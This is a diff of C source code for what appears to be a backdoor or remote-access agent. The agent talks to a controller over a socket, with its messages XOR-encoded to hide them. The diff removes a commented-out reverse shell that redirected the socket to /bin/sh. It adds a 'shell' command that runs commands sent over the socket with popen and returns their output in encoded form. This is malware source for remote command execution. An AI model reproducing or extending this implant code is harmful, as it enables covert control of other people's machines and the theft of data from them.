@@ -43,35 +43,45 @@ int main(void)
 				char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
 				write(sock, xorhelp, strlen(MSG_HELP));
 			}
-
-			// TODO: Make proper shell agent command
-			/*
-			else if(strncmp(buf, "shell\n", 6) == 0)
+			
+			else if(str_starts_with(xorbuf, "shell") == 1)
 			{
 
 				int status = 0;
 				pid_t wpid, child_pid;
-
-				char* const argv[] = {"/bin/sh", NULL};
+				FILE* fp;
+				
+				
+				char* cmd = split(xorbuf, " ");			
+	
 				if((child_pid = fork()) == 0)
 				{
 					char shell_msg[50];
-					snprintf(shell_msg, 50, "\nReverse shell session started on PID %i\n", getpid());
-					write(sock, shell_msg, strlen(shell_msg));
+					snprintf(shell_msg, 50, "\nExecuting command on PID %i\n", getpid());
+					char* xorshellmsg = XOR(shell_msg, key, strlen(shell_msg), keylen);
+					write(sock, xorshellmsg, strlen(shell_msg));
 
-					dup2(sock, 0);
-					dup2(sock, 1);
-					dup2(sock, 2);
-					// Create a child process and start shell inside of it
-					execve("/bin/sh", argv, NULL);
+					// Create a child process and run command inside of it
+					fp = popen(cmd, "r");
+					if(fp == NULL) {
+					    char* error = "Failed to run command\n";
+					    char* xorerror = XOR(error, key, strlen(error), keylen);
+					    write(sock, xorerror, strlen(error));
+					    
+					}
+					char path[2050];
+					while (fgets(path, sizeof(path), fp) != NULL) {
+					    					     
+					    char* xordata = XOR(path, key, strlen(path), keylen);
+					    write(sock, xordata, strlen(path));
+					}
+					
 					exit(EXIT_SUCCESS);
 				}
 				// Make the parent process wait for child process to terminate
-				while ((wpid = wait(&status)) > 0);     
+				while ((wpid = wait(&status)) > 0);
 
-				write(sock, MSG_EXIT_RSHELL, strlen(MSG_EXIT_RSHELL));
 			}
-*/
 			else if(strncmp(buf, "exit\n", 5) == 0)
 			{
 				char* xorexit = XOR(MSG_EXIT_CMD, key, strlen(MSG_EXIT_CMD), keylen);
